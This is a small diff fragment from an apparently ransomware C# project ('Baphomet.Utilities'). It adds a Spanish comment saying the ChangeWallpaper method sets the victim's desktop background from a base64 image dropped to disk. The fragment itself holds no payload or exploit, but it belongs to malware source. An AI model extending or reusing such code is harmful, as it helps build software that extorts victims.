@@ -35,6 +35,7 @@ namespace Baphomet.Utilities
         }
 
         //Wallpaper method.
+        //Este metodo es el encargado de cambiar la imagen de fondo de la victima.
         public void ChangeWallpaper(string imagebase64, string dropPath)
         {
             byte[] imageBytes = Convert.FromBase64String(imagebase64);
